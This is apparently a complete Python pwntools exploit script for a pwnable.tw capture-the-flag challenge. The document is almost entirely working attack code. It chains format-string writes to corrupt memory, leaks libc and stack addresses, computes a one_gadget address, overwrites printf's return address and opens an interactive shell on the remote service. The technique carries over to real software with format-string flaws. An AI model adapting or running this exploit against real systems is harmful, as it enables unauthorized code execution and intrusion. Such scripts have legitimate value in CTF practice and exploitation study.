from pwn import *

io = remote('chall.pwnable.tw', 10307)

payload = '%{}c%{}$hhn'.format(0x09, 17)
payload += '%{}c%{}$hhn'.format(0x25 - 0x09, 16)
payload += '%{}c%{}$hhn'.format(0x40 - 0x25, 18)
payload += '%{}$hhn'.format(19)
payload += '%{}c%{}$hhn'.format(0x95 - 0x40, 20)
payload += '%{}c%{}$hn'.format(0x248 - 0x95, 42)
payload = payload.encode().ljust(0x50, b'\0')
payload += p64(0x601000) + p64(0x601001) + p64(0x601002) + p64(0x601020) + p64(0x601021)
io.recvuntil('Input :')
io.send(payload)

# leak libc and stack
payload = '%{}c%{}$hhn'.format(0x25, 23)
payload += '|%1$llx|%3$llx|\n\0'

io.wait(1)
io.send(payload)
leak = io.recvlineS().split('|')

# get return address and libc base address
printf_ret = int(leak[1], 16) - 0x40
libc_base = int(leak[2], 16) - 0xf6680

one_gadget = libc_base + 0xf0567
one_gadget_short1 = one_gadget & 0xffff
one_gadget_short2 = (one_gadget & 0xffff0000) >> 16
one_gadget_short3 = (one_gadget & 0xffff00000000) >> 32

# overwrite return address with one gadget
payload = '%{}c%{}$hn'.format(one_gadget_short1, 21)
payload += '%{}c%{}$hn'.format((one_gadget_short2 - one_gadget_short1) % 0x10000, 22)
payload += '%{}c%{}$hn'.format((one_gadget_short3 - one_gadget_short2) % 0x10000, 23)
payload = payload.encode().ljust(0x40, b'\0')
payload += p64(printf_ret)
payload += p64(printf_ret + 2)
payload += p64(printf_ret + 4)

io.wait(1)
io.send(payload)

io.interactive()
